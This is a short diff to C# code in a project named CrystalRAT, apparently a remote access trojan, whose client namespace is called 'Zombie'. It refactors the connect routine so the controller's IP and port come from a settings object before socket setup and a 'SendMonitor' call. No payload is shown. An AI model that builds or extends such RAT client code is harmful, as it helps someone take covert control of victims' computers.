@@ -1,4 +1,5 @@
-﻿using CrystalRATShared.Serialization;
+﻿using CrystalRATShared.Helper;
+using CrystalRATShared.Serialization;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -9,6 +10,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Zombie.Functions;
+using Zombie.Helper;
 
 namespace Zombie.Web
 {
@@ -146,10 +148,10 @@ namespace Zombie.Web
 
         }
 
-        public static void Start(string ip, int port)
+        public static void Connect(ClientSettings settings)
         {
-            _ip = ip;
-            _port = port;
+            _ip = settings.IP;
+            _port = settings.Port;
 
             SocketInit();
             SendMonitor();
